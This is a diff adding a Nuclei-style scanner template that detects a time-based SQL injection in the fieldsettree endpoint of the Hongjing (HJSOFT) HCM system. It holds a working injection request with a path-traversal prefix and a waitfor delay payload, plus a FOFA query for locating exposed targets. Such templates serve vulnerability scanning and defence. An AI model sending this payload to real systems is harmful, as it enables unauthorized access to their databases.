@@ -1,0 +1,27 @@
+id: hjsoft-fieldsettree-sqli
+
+info:
+  name: 宏景 HCM 系统 fieldsettree - sqli
+  author: leadlife
+  severity: high
+  description: 宏景 HCM 系统 fieldsettree 接口存在SQL注入漏洞。攻击者可以利用该漏洞执行任意SQL命令，可能导致数据泄露或数据库被破坏。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+  tags: hjsoft,hcm,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1';waitfor+delay+'0:0:6'+-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
